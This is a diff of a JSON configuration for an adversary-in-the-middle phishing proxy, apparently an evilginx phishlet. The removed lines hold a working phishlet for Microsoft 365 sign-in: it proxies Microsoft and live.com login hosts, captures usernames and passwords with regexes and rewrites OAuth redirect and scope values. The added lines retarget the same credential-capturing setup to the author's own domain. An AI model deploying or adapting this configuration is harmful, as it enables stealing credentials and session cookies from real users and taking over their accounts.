@@ -1,59 +1,59 @@
 
 {
-  "name": "office.com",
+  "name": "fluxxset.com",
   "author": "@fluxxset",
   "min_version": "1.0.0",
-  "target_url": "https://login.microsoftonline.com/",
-  "redirect_url": "https://login.microsoftonline.com/",
+  "target_url": "https://fluxxset.com/",
+  "redirect_url": "https://fluxxset.com/",
   "proxy_domain": "xx.in",
   "proxy_auth": "/xxx/ekfbsejhbesjhfgive",
   "hosts_to_proxy": [
     {
-      "host": "login.microsoftonline.com",
-      "orignal_subdomain": "login",
-      "proxy_subdomain": "login",
-      "reverce_filter": true,
-      "auto_filter": true
-    },
-    {
-      "host": "www.office.com",
-      "orignal_subdomain": "www",
-      "proxy_subdomain": "www",
-      "reverce_filter": true,
-      "auto_filter": true
-    },
-    {
-      "host": "account.live.com",
-      "orignal_subdomain": "account",
-      "proxy_subdomain": "account",
-      "reverce_filter": true,
-      "auto_filter": true
-    },
-    {
-      "host": "login.live.com",
-      "orignal_subdomain": "login",
-      "proxy_subdomain": "login1",
-      "reverce_filter": true,
-      "auto_filter": true
-    },
-    {
-      "host": "outlook.live.com",
-      "orignal_subdomain": "outlook",
-      "proxy_subdomain": "outlook",
-      "reverce_filter": true,
-      "auto_filter": true
-    },
-    {
-      "host": "office.com",
+      "host": "fluxxset.com",
       "orignal_subdomain": "",
       "proxy_subdomain": "",
       "reverce_filter": true,
       "auto_filter": true
     },
     {
-      "host": "logincdn.msftauth.net",
-      "orignal_subdomain": "logincdn",
-      "proxy_subdomain": "logincdn",
+      "host": "www.fluxxset.com",
+      "orignal_subdomain": "www",
+      "proxy_subdomain": "www",
+      "reverce_filter": true,
+      "auto_filter": true
+    },
+    {
+      "host": "fourthwall.fluxxset.com",
+      "orignal_subdomain": "fourthwall",
+      "proxy_subdomain": "fourthwall",
+      "reverce_filter": true,
+      "auto_filter": true
+    },
+    {
+      "host": "hire.fluxxset.com",
+      "orignal_subdomain": "hire",
+      "proxy_subdomain": "hire",
+      "reverce_filter": true,
+      "auto_filter": true
+    },
+    {
+      "host": "shop.fluxxset.com",
+      "orignal_subdomain": "shop",
+      "proxy_subdomain": "shop",
+      "reverce_filter": true,
+      "auto_filter": true
+    },
+    {
+      "host": "tools.fluxxset.com",
+      "orignal_subdomain": "tools",
+      "proxy_subdomain": "tools",
+      "reverce_filter": true,
+      "auto_filter": true
+    },
+    {
+      "host": "www.fourthwall.fluxxset.com",
+      "orignal_subdomain": "www.fourthwall",
+      "proxy_subdomain": "wxxxxwall",
       "reverce_filter": true,
       "auto_filter": true
     }
@@ -63,48 +63,33 @@
       "type": "url",
       "url": "*",
       "method": "GET",
-      "locate": ".xx.in%2fv2%2fOfficeHome.All",
-      "replace": ".office.com%2fv2%2fOfficeHome.All"
+      "locate": "Fluxxset",
+      "replace": "Changed"
     },
     {
       "type": "url",
       "url": "*",
       "method": "GET",
-      "locate": ".xx.in%2flandingv2",
-      "replace": ".office.com%2flandingv2"
-    },
-    {
-      "type": "url",
-      "url": "*",
-      "method": "GET",
-      "locate": "?iframed_by=https%3a%2f%2flogin.xx.in",
-      "replace": "?iframed_by=https%3a%2f%2flogin.office.com"
+      "locate": "fluxxset.com",
+      "replace": "xx.in"
     }
   ],
   "auth_urls": [
-    "/",
-    "/kmsi",
-    "/?auth=2",
-    "/common/login",
-    "/common/oauth2/",
-    "/landingv2*",
-    "/ppsecure/*",
-    "/ppsecure/post.srf*",
-    "/landing*",
-    "/common/SAS/ProcessAuth"
+    "/login",
+    "/session"
   ],
   "credentials": [
     {
       "type": "post",
       "name": "username",
-      "keyword": "\"username\":\"([^\"]*)",
-      "regexp": "true"
+      "keyword": "login",
+      "regexp": "false"
     },
     {
       "type": "post",
       "name": "password",
-      "keyword": "\"password\":\"([^\"]*)",
-      "regexp": "true"
+      "keyword": "password",
+      "regexp": "false"
     }
   ],
   "cookies": [
@@ -121,27 +106,20 @@
   ],
   "force_get": [
     {
-      "url": "*",
+      "url": "/login",
       "method": "GET",
-      "keyword": "redirect_uri",
+      "keyword": "redirect_url",
       "regexp": "false",
-      "replace_value": "https%3A%2F%2Fwww.office.com%2Flandingv2"
-    },
-    {
-      "url": "*",
-      "method": "GET",
-      "keyword": "scope",
-      "regexp": "false",
-      "replace_value": "openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All"
+      "replace_value": "/t/evilginx-redirect-loop/1722"
     }
   ],
   "inject_js": [
     {
-      "host": "login.microsoftonline.com",
+      "host": "fluxxset.com",
       "url": "/",
       "js_code": "console.log('Hello, world!');"
     }
   ],
-  "landing_url": "/",
-  "landing_host": "login.microsoftonline.com"
+  "landing_url": "/login",
+  "landing_host": "fluxxset.com"
 }
